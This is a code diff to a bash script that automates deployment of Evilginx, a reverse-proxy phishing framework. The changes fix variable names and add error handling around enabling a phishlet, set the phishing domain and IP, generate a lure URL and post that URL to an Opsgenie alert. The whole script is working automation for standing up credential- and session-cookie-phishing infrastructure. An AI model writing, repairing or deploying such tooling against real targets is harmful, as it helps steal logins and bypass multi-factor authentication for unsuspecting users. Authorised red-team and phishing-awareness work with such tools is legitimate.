@@ -1,7 +1,7 @@
 #!/bin/bash
 setup_evilginx() {
     domain_name=$1
-    hostname=$2
+    host_ip=$2
     redirect_url=$3
     default_phishlet=$4
     
@@ -9,11 +9,13 @@ setup_evilginx() {
 
     # Enable the phishlet
     #sudo evilginx phishlets enable $default_phishlet
-    phishlets enable $default_phishlet
-    
+    if ! phishlets enable "$default_phishlet"; then
+    echo "Failed to enable phishlet" >&2
+    exit 1
+    fi    
     # Set up the hostname (domain or subdomain)
     #sudo evilginx config domain "$subdomain"
-    config domain "$subdomain"
+    config domain "$domain_name"
     
     # Bind to the IP address
     #sudo evilginx config ip "$host_ip"
@@ -189,4 +191,4 @@ lure_url=$(create_lure /app/phishlets/ $domain_name $default_redirect)
 
 # Example usage of the function
 API_URL="https://api.opsgenie.com/v2/alerts" # This can be dynamically changed
-send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url
+send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
